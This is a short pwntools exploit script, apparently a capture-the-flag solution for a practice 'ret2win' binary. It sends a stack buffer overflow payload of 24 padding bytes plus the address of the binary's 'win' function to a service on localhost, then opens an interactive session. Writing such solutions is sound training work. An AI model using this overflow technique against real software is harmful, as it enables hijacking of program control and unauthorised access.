from pwn import *

elf = context.binary = ELF('./ret2win')
context.log_level = "debug"
p = remote("localhost", "1340")
# p = process('./ret2win')

payload = b'A'*24 + p64(elf.sym["win"])

p.sendline(payload)

p.interactive()

